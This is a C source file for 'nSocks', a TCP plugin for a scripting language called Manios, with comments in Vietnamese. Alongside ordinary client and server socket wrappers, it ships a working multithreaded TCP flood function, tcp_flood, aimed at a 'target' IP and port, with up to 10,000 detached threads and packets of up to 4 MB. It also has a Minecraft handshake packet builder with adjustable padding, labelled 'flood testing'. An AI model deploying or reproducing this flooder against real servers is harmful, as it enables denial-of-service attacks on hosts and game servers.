/*
 * nsocks.c — nSocks: TCP Networking Plugin for Manios
 * ============================================================================
 * Author:  IdlerHa
 * Version: 1.0.0
 * License: MIT
 *
 * Mot thu vien TCP networking cho Manios.
 * Ho tro ca client, server va flood testing.
 * Dung dinh dang nPlugin cua Manios (MNOS_EXT_BEGIN/END).
 *
 * Build:
 *   gcc -shared -fPIC -I/usr/local/share/manios/include -o nsocks.so nsocks.c
 *
 * Dung trong Manios:
 *   load_ext("~/.manios/nplugin/nsocks.so")
 *   sock = nsocks_connect("example.com", 80)
 *   nsocks_send(sock, "GET / HTTP/1.0\r\n\r\n")
 *   data = nsocks_recv(sock, 4096)
 *   nsocks_close(sock)
 * ============================================================================
 */

#include "mnos_ext.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <pthread.h>
#include <stdatomic.h>

/* ========================================================================
 * Flood stats & thread management
 * ======================================================================== */
static atomic_ullong nsocks_flood_bytes = 0;
static atomic_int nsocks_flood_running = 0;

/* ========================================================================
 * nsocks_version() — tra ve phien ban
 * ======================================================================== */
static Val nsocks_version(Val *a, int n) {
    (void)a; (void)n;
    return val_str("nSocks v1.0.0 - TCP Networking Plugin for Manios");
}

/* ========================================================================
 * nsocks_resolve(host) — DNS resolution
 *   host: "example.com" hoac "1.2.3.4"
 *   tra ve: IP string (VD: "93.184.216.34")
 * ======================================================================== */
static Val nsocks_resolve(Val *a, int n) {
    if (n < 1 || a[0].type != V_STR) {
        return val_str("");
    }
    const char *host = a[0].sval;

    /* Check if already an IP */
    struct in_addr addr_test;
    if (inet_pton(AF_INET, host, &addr_test) == 1) {
        return val_str(host);
    }

    /* DNS lookup */
    struct hostent *he = gethostbyname(host);
    if (!he || he->h_addrtype != AF_INET) {
        fprintf(stderr, "[nsocks] Khong the resolve: %s\n", host);
        return val_str("");
    }

    char ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, he->h_addr_list[0], ip, sizeof(ip));
    return val_str(ip);
}

/* ========================================================================
 * nsocks_connect(host, port) — mo ket noi TCP
 *   host: domain hoac IP
 *   port: so port (1-65535)
 *   tra ve: socket fd (int), -1 neu that bai
 * ======================================================================== */
static Val nsocks_connect(Val *a, int n) {
    if (n < 2) {
        fprintf(stderr, "[nsocks] nsocks_connect(host, port)\n");
        return val_int(-1);
    }

    const char *host = a[0].sval;
    int port = (int)(a[1].type == V_INT ? a[1].ival : 0);

    if (port <= 0 || port > 65535) {
        fprintf(stderr, "[nsocks] Port khong hop le: %d\n", port);
        return val_int(-1);
    }

    /* Resolve host */
    Val ipv = nsocks_resolve(a, 1);
    const char *ip = ipv.sval;
    if (!ip || !ip[0]) {
        fprintf(stderr, "[nsocks] Khong the resolve: %s\n", host);
        val_free(&ipv);
        return val_int(-1);
    }

    /* Create socket */
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[nsocks] Khong the tao socket: %s\n", strerror(errno));
        return val_int(-1);
    }

    /* Set timeout */
    struct timeval tv;
    tv.tv_sec = 10;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    /* Connect */
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((unsigned short)port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        fprintf(stderr, "[nsocks] Khong the ket noi: %s:%d (%s)\n", host, port, strerror(errno));
        close(sock);
        val_free(&ipv);
        return val_int(-1);
    }

    val_free(&ipv);
    fprintf(stderr, "[nsocks] Da ket noi: %s:%d (fd=%d)\n", host, port, sock);
    return val_int(sock);
}

/* ========================================================================
 * nsocks_send(fd, data) — gui du lieu qua socket
 *   fd: socket descriptor tu nsocks_connect()
 *   data: string can gui
 *   tra ve: so bytes da gui, -1 neu that bai
 * ======================================================================== */
static Val nsocks_send(Val *a, int n) {
    if (n < 2) {
        fprintf(stderr, "[nsocks] nsocks_send(fd, data)\n");
        return val_int(-1);
    }

    int fd = (int)(a[0].type == V_INT ? a[0].ival : -1);
    if (fd < 0) {
        fprintf(stderr, "[nsocks] fd khong hop le\n");
        return val_int(-1);
    }

    const char *data;
    int len;

    if (a[1].type == V_STR) {
        data = a[1].sval;
        len = a[1].slen;
    } else if (a[1].type == V_BYTES) {
        data = a[1].sval;
        len = a[1].slen;
    } else {
        /* Convert to string */
        char *s = val_to_str(a[1]);
        ssize_t sent = send(fd, s, strlen(s), 0);
        free(s);
        return val_int((long long)sent);
    }

    ssize_t sent = send(fd, data, len, 0);
    if (sent < 0) {
        fprintf(stderr, "[nsocks] Send that bai: %s\n", strerror(errno));
    }
    return val_int((long long)sent);
}

/* ========================================================================
 * nsocks_recv(fd, size) — nhan du lieu tu socket
 *   fd: socket descriptor
 *   size: so bytes toi da nhan (mac dinh 4096)
 *   tra ve: string chua du lieu nhan duoc
 * ======================================================================== */
static Val nsocks_recv(Val *a, int n) {
    if (n < 1) {
        fprintf(stderr, "[nsocks] nsocks_recv(fd, [size])\n");
        return val_str("");
    }

    int fd = (int)(a[0].type == V_INT ? a[0].ival : -1);
    if (fd < 0) {
        fprintf(stderr, "[nsocks] fd khong hop le\n");
        return val_str("");
    }

    int bufsize = 4096;
    if (n >= 2 && a[1].type == V_INT) {
        bufsize = (int)a[1].ival;
        if (bufsize <= 0) bufsize = 4096;
        if (bufsize > 1048576) bufsize = 1048576; /* Max 1MB */
    }

    char *buf = malloc(bufsize + 1);
    if (!buf) return val_str("");

    ssize_t nread = recv(fd, buf, bufsize, 0);
    if (nread < 0) {
        if (errno == EAGAIN || errno == EWOULDBLOCK) {
            /* Timeout - return empty */
            free(buf);
            return val_str("");
        }
        fprintf(stderr, "[nsocks] Recv that bai: %s\n", strerror(errno));
        free(buf);
        return val_str("");
    }

    if (nread == 0) {
        /* Connection closed */
        free(buf);
        return val_str("");
    }

    buf[nread] = '\0';
    Val v = val_str(buf);
    free(buf);
    return v;
}

/* ========================================================================
 * nsocks_close(fd) — dong socket
 *   fd: socket descriptor
 *   tra ve: true neu thanh cong
 * ======================================================================== */
static Val nsocks_close_sock(Val *a, int n) {
    if (n < 1) return val_bool(0);

    int fd = (int)(a[0].type == V_INT ? a[0].ival : -1);
    if (fd < 0) return val_bool(0);

    if (close(fd) == 0) {
        fprintf(stderr, "[nsocks] Da dong socket (fd=%d)\n", fd);
        return val_bool(1);
    }
    return val_bool(0);
}

/* ========================================================================
 * nsocks_bind(ip, port) — tao server socket lang nghe
 *   ip: "0.0.0.0" cho tat ca interfaces
 *   port: so port
 *   tra ve: listening socket fd, -1 neu that bai
 * ======================================================================== */
static Val nsocks_bind(Val *a, int n) {
    if (n < 2) {
        fprintf(stderr, "[nsocks] nsocks_bind(ip, port)\n");
        return val_int(-1);
    }

    const char *ip = a[0].sval;
    int port = (int)(a[1].type == V_INT ? a[1].ival : 0);

    if (port <= 0 || port > 65535) {
        fprintf(stderr, "[nsocks] Port khong hop le: %d\n", port);
        return val_int(-1);
    }

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[nsocks] Khong the tao socket: %s\n", strerror(errno));
        return val_int(-1);
    }

    /* Reuse address */
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((unsigned short)port);

    if (strcmp(ip, "0.0.0.0") == 0 || ip[0] == '\0') {
        addr.sin_addr.s_addr = INADDR_ANY;
    } else {
        inet_pton(AF_INET, ip, &addr.sin_addr);
    }

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        fprintf(stderr, "[nsocks] Bind that bai %s:%d (%s)\n", ip, port, strerror(errno));
        close(sock);
        return val_int(-1);
    }

    if (listen(sock, 5) < 0) {
        fprintf(stderr, "[nsocks] Listen that bai: %s\n", strerror(errno));
        close(sock);
        return val_int(-1);
    }

    fprintf(stderr, "[nsocks] Dang lang nghe: %s:%d (fd=%d)\n", ip, port, sock);
    return val_int(sock);
}

/* ========================================================================
 * nsocks_accept(fd) — chap nhan ket noi den server
 *   fd: listening socket fd
 *   tra ve: list [client_fd, ip, port] hoac none neu khong co ket noi
 * ======================================================================== */
static Val nsocks_accept(Val *a, int n) {
    if (n < 1) return val_none();

    int fd = (int)(a[0].type == V_INT ? a[0].ival : -1);
    if (fd < 0) return val_none();

    /* Set non-blocking to check */
    fd_set readfds;
    struct timeval tv;
    FD_ZERO(&readfds);
    FD_SET(fd, &readfds);
    tv.tv_sec = 0;
    tv.tv_usec = 0;

    if (select(fd + 1, &readfds, NULL, NULL, &tv) <= 0) {
        return val_none();  /* No pending connection */
    }

    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);
    int client_fd = accept(fd, (struct sockaddr *)&client_addr, &client_len);

    if (client_fd < 0) {
        return val_none();
    }

    char client_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));
    int client_port = ntohs(client_addr.sin_port);

    /* Return as list: [client_fd, ip, port] */
    Val list = val_list();
    list.li[list.llen++] = val_int(client_fd);
    list.li[list.llen++] = val_str(client_ip);
    list.li[list.llen++] = val_int(client_port);

    fprintf(stderr, "[nsocks] Chap nhan ket noi: %s:%d (fd=%d)\n", client_ip, client_port, client_fd);
    return list;
}

/* ========================================================================
 * nsocks_mc_packet(ip, port, pktsize) — tao Minecraft handshake packet
 *   ip: dia chi server Minecraft
 *   port: port server (thuong la 25565)
 *   protocol: Minecraft protocol version (VD: 756 cho 1.19+, 767 cho 1.21+).
 *             Mac dinh 756 neu khong truyen.
 *   pktsize: kich thuoc packet tong (bao gom padding)
 *   tra ve: bytes (packet da build)
 *
 * Dung de test server hoac debug giao thuc Minecraft.
 * KHONG dung de tan cong!
 * ======================================================================== */
static Val nsocks_mc_packet(Val *a, int n) {
    if (n < 3) {
        fprintf(stderr, "[nsocks] nsocks_mc_packet(ip, port, pktsize [, protocol=756])\n");
        return val_str("");
    }

    const char *ip = a[0].sval;
    int port = (int)(a[1].type == V_INT ? a[1].ival : 25565);
    int pktsize = (int)(a[2].type == V_INT ? a[2].ival : 256);
    int protocol = 756; /* Default: Minecraft 1.19+ */
    if (n >= 4 && a[3].type == V_INT) {
        protocol = (int)a[3].ival;
        if (protocol < 0) protocol = -1; /* -1 for pre-netty */
    }

    if (!ip || !ip[0]) return val_str("");
    if (port <= 0 || port > 65535) port = 25565;
    if (pktsize <= 0) pktsize = 256;
    if (pktsize > 65536) pktsize = 65536;

    int ip_len = (int)strlen(ip);

    /* Build Minecraft Handshake + Status Request packet */
    /* Format:
     *   Handshake: <length> <packet_id=0x00> <protocol_version_varint> <server_addr_len> <server_addr> <port_uint16> <next_state_varint>
     *   Status Request: <length> <packet_id=0x00>
     */

    /* Calculate handshake body size */
    /* packet ID (1) + protocol version (varint ~1-5) + addr len (1) + addr (ip_len) + port (2) + next state (1) */
    int body_size = 1 + 1 + 1 + ip_len + 2 + 1; /* ~7 + ip_len */

    unsigned char *packet = (unsigned char *)malloc(pktsize);
    if (!packet) return val_str("");

    memset(packet, 0, pktsize);

    /* ---- Handshake Packet ---- */
    /* Length prefix (VarInt) */
    packet[0] = (unsigned char)body_size;

    /* Packet ID = 0x00 (Handshake) */
    packet[1] = 0x00;

    /* Protocol Version (VarInt) */
    /* Encode protocol version as VarInt (up to 2 bytes for versions < 16384) */
    if (protocol < 0) {
        /* -1 = 0xFFFFFFFFFFFFFFFF: use -1 for pre-netty compatibility */
        /* VarInt -1 = 0xFF 0xFF 0xFF 0xFF 0x0F (5 bytes) */
        packet[2] = 0xFF; packet[3] = 0xFF; packet[4] = 0xFF; packet[5] = 0xFF; packet[6] = 0x0F;
        /* Shift everything after protocol by +3 bytes (was 2, now 5) */
        int shift = 3;
        int rest_start = 7; /* Original position after 2-byte varint */
        int rest_len = body_size - rest_start;
        memmove(packet + rest_start + shift, packet + rest_start, rest_len);
        body_size += shift;
        packet[0] = (unsigned char)body_size;
    } else {
        /* Standard VarInt encoding */
        int remaining = protocol;
        int vi_pos = 2;
        do {
            unsigned char byte = remaining & 0x7F;
            remaining = (unsigned int)remaining >> 7;
            if (remaining != 0) byte |= 0x80;
            packet[vi_pos++] = byte;
        } while (remaining != 0 && vi_pos < 7);
        
        /* Adjust if varint size differs from default 2 bytes */
        int shift = (vi_pos - 2) - 2; /* Difference from original 2-byte varint */
        if (shift != 0 && vi_pos - 2 + shift <= 5) {
            int rest_start = 4; /* Original position after 2-byte varint */
            int rest_len = body_size - rest_start;
            memmove(packet + rest_start + shift, packet + rest_start, rest_len);
            body_size += shift;
            packet[0] = (unsigned char)body_size;
        }
    }

    /* Server Address length + string */
    packet[4] = (unsigned char)ip_len;
    memcpy(packet + 5, ip, ip_len);

    /* Port (unsigned short, big-endian) */
    packet[5 + ip_len] = (unsigned char)((port >> 8) & 0xFF);
    packet[6 + ip_len] = (unsigned char)(port & 0xFF);

    /* Next State = 1 (Status) */
    packet[7 + ip_len] = 0x01;

    int handshake_size = 8 + ip_len;

    /* ---- Status Request Packet ---- */
    packet[handshake_size] = 0x01;  /* Length = 1 */
    packet[handshake_size + 1] = 0x00; /* Packet ID = 0x00 (Status Request) */

    int header_size = handshake_size + 2;

    /* Pad remaining with zeros */
    if (pktsize > header_size) {
        /* Already zeroed by memset */
    }

    /* Return as raw bytes */
    Val v;
    memset(&v, 0, sizeof(v));
    v.type = V_BYTES;
    v.sval = (char *)packet;
    v.slen = pktsize;

    return v;
}

/* ========================================================================
 * nsocks_set_timeout(fd, seconds) — dat timeout cho socket
 *   fd: socket descriptor
 *   seconds: timeout in seconds (0 = mac dinh 10s)
 *   tra ve: true neu OK
 * ======================================================================== */
static Val nsocks_set_timeout(Val *a, int n) {
    if (n < 1) return val_bool(0);

    int fd = (int)(a[0].type == V_INT ? a[0].ival : -1);
    if (fd < 0) return val_bool(0);

    int sec = 10;
    if (n >= 2 && a[1].type == V_INT) {
        sec = (int)a[1].ival;
        if (sec < 0) sec = 0;
    }

    struct timeval tv;
    tv.tv_sec = sec;
    tv.tv_usec = 0;

    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    return val_bool(1);
}

/* ========================================================================
 * nsocks_getpeername(fd) — lay IP/port cua peer
 *   fd: socket descriptor
 *   tra ve: string "IP:PORT" hoac "" neu that bai
 * ======================================================================== */
static Val nsocks_getpeername(Val *a, int n) {
    if (n < 1) return val_str("");

    int fd = (int)(a[0].type == V_INT ? a[0].ival : -1);
    if (fd < 0) return val_str("");

    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);

    if (getpeername(fd, (struct sockaddr *)&addr, &len) < 0) {
        return val_str("");
    }

    char ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &addr.sin_addr, ip, sizeof(ip));
    int port = ntohs(addr.sin_port);

    char buf[128];
    snprintf(buf, sizeof(buf), "%s:%d", ip, port);
    return val_str(buf);
}

/* ========================================================================
 * nsocks_tcp_flood_reset_stats() — reset bo dem flood
 * ======================================================================== */
static Val nsocks_tcp_flood_reset_stats(Val *a, int n) {
    (void)a; (void)n;
    atomic_store(&nsocks_flood_bytes, 0);
    return val_bool(1);
}

/* ========================================================================
 * nsocks_tcp_flood_stats() — lay tong so bytes da gui
 *   tra ve: so bytes da gui (int)
 * ======================================================================== */
static Val nsocks_tcp_flood_stats(Val *a, int n) {
    (void)a; (void)n;
    return val_int((long long)atomic_load(&nsocks_flood_bytes));
}

/* ========================================================================
 * Flood worker thread
 * ======================================================================== */
typedef struct {
    char ip[64];
    int port;
    int data_size;
    int packets_per_conn;
} nsocks_flood_args_t;

static void *nsocks_flood_worker(void *arg) {
    nsocks_flood_args_t *args = (nsocks_flood_args_t *)arg;

    /* Allocate send buffer */
    unsigned char *data = (unsigned char *)malloc(args->data_size);
    if (!data) return NULL;
    memset(data, 0x00, args->data_size);

    while (atomic_load(&nsocks_flood_running)) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            usleep(10000);
            continue;
        }

        /* Set timeout */
        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        /* Connect */
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons((unsigned short)args->port);
        inet_pton(AF_INET, args->ip, &addr.sin_addr);

        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            close(sock);
            usleep(50000);
            continue;
        }

        /* Send packets */
        for (int i = 0; i < args->packets_per_conn && atomic_load(&nsocks_flood_running); i++) {
#ifdef MSG_NOSIGNAL
            ssize_t sent = send(sock, data, args->data_size, MSG_NOSIGNAL);
#else
            ssize_t sent = send(sock, data, args->data_size, 0);
#endif
            if (sent < 0) break;
            atomic_fetch_add(&nsocks_flood_bytes, (unsigned long long)sent);
        }

        close(sock);
    }

    free(data);
    free(args);
    return NULL;
}

/* ========================================================================
 * nsocks_tcp_flood(ip, port, threads, data_size, packets_per_conn)
 *   ip: dia chi IP muc tieu
 *   port: port muc tieu
 *   threads: so luong thread
 *   data_size: kich thuoc moi goi tin (bytes)
 *   packets_per_conn: so goi tin gui moi ket noi
 *   tra ve: true neu flood bat dau thanh cong
 *
 * Luu y: Ham nay NON-BLOCKING! Threads chay background.
 *         Dung tcp_flood_stop() de dung hoac Ctrl+C.
 * ======================================================================== */
static Val nsocks_tcp_flood(Val *a, int n) {
    if (n < 5) {
        fprintf(stderr, "[nsocks] tcp_flood(ip, port, threads, data_size, packets_per_conn)\n");
        return val_bool(0);
    }

    const char *ip = a[0].sval;
    int port = (int)(a[1].type == V_INT ? a[1].ival : 0);
    int thread_count = (int)(a[2].type == V_INT ? a[2].ival : 1);
    int data_size = (int)(a[3].type == V_INT ? a[3].ival : 1024);
    int packets_per_conn = (int)(a[4].type == V_INT ? a[4].ival : 10);

    if (!ip || !ip[0]) return val_bool(0);
    if (port <= 0 || port > 65535) {
        fprintf(stderr, "[nsocks] Port khong hop le: %d\n", port);
        return val_bool(0);
    }
    if (thread_count <= 0) thread_count = 1;
    if (thread_count > 10000) thread_count = 10000;
    if (data_size <= 0) data_size = 1024;
    if (data_size > 4194304) data_size = 4194304; /* Max 4MB */
    if (packets_per_conn <= 0) packets_per_conn = 10;

    /* Check if already running */
    if (atomic_load(&nsocks_flood_running)) {
        fprintf(stderr, "[nsocks] Flood da dang chay! Dung tcp_flood_stop() truoc khi bat dau moi.\n");
        return val_bool(0);
    }

    /* Resolve IP */
    Val ipv_arg = val_str(ip);
    Val ipv = nsocks_resolve(&ipv_arg, 1);
    val_free(&ipv_arg);
    const char *resolved_ip = ipv.sval;
    if (!resolved_ip || !resolved_ip[0]) {
        fprintf(stderr, "[nsocks] Khong the resolve: %s\n", ip);
        val_free(&ipv);
        return val_bool(0);
    }

    /* Reset stats */
    atomic_store(&nsocks_flood_bytes, 0);
    atomic_store(&nsocks_flood_running, 1);

    fprintf(stderr, "[nsocks] Bat dau flood: %s:%d | %d threads | %d bytes/packet | %d packets/conn\n",
            resolved_ip, port, thread_count, data_size, packets_per_conn);

    /* Spawn & detach threads (non-blocking!) */
    for (int i = 0; i < thread_count; i++) {
        nsocks_flood_args_t *args = (nsocks_flood_args_t *)malloc(sizeof(nsocks_flood_args_t));
        if (!args) continue;

        strncpy(args->ip, resolved_ip, sizeof(args->ip) - 1);
        args->ip[sizeof(args->ip) - 1] = '\0';
        args->port = port;
        args->data_size = data_size;
        args->packets_per_conn = packets_per_conn;

        pthread_t tid;
        if (pthread_create(&tid, NULL, nsocks_flood_worker, args) == 0) {
            pthread_detach(tid);  /* Tu dong clean up khi thread ket thuc */
        } else {
            free(args);
        }
    }

    val_free(&ipv);

    fprintf(stderr, "[nsocks] %d threads da duoc spawn. Dung Ctrl+C hoac tcp_flood_stop() de dung.\n", thread_count);
    return val_bool(1);
}

/* ========================================================================
 * nsocks_tcp_flood_stop() — dung flood dang chay
 * ======================================================================== */
static Val nsocks_tcp_flood_stop(Val *a, int n) {
    (void)a; (void)n;
    if (atomic_load(&nsocks_flood_running)) {
        atomic_store(&nsocks_flood_running, 0);
        fprintf(stderr, "[nsocks] Da gui tin hieu dung flood. Threads se thoat khi ket thuc ket noi hien tai.\n");
        return val_bool(1);
    }
    fprintf(stderr, "[nsocks] Khong co flood nao dang chay.\n");
    return val_bool(0);
}

/* ========================================================================
 * Dang ky plugin
 * ======================================================================== */
MNOS_EXT_BEGIN(nsocks)
    MNOS_EXT_FUNC("nsocks_version",            nsocks_version,               "nSocks v1.0.0 - TCP Networking Plugin")
    MNOS_EXT_FUNC("nsocks_resolve",            nsocks_resolve,               "resolve(host) -> IP string")
    MNOS_EXT_FUNC("nsocks_connect",            nsocks_connect,               "connect(host, port) -> socket fd")
    MNOS_EXT_FUNC("nsocks_send",               nsocks_send,                  "send(fd, data) -> bytes sent")
    MNOS_EXT_FUNC("nsocks_recv",               nsocks_recv,                  "recv(fd, [size=4096]) -> data string")
    MNOS_EXT_FUNC("nsocks_close",              nsocks_close_sock,            "close(fd) -> bool")
    MNOS_EXT_FUNC("nsocks_bind",               nsocks_bind,                  "bind(ip, port) -> server fd")
    MNOS_EXT_FUNC("nsocks_accept",             nsocks_accept,                "accept(fd) -> [client_fd, ip, port] or none")
    MNOS_EXT_FUNC("nsocks_mc_packet",          nsocks_mc_packet,             "mc_packet(ip, port, size) -> Minecraft handshake packet")
    MNOS_EXT_FUNC("nsocks_set_timeout",        nsocks_set_timeout,           "set_timeout(fd, seconds) -> bool")
    MNOS_EXT_FUNC("nsocks_getpeername",        nsocks_getpeername,           "getpeername(fd) -> ip:port string")
    MNOS_EXT_FUNC("tcp_flood_reset_stats",     nsocks_tcp_flood_reset_stats, "Reset TCP flood byte counter")
    MNOS_EXT_FUNC("tcp_flood_stats",           nsocks_tcp_flood_stats,       "Get total bytes sent by flood")
    MNOS_EXT_FUNC("tcp_flood",                 nsocks_tcp_flood,             "flood(ip, port, threads, data_size, packets_per_conn) -> bool")
    MNOS_EXT_FUNC("tcp_flood_stop",            nsocks_tcp_flood_stop,        "Stop all flood threads immediately")
MNOS_EXT_END
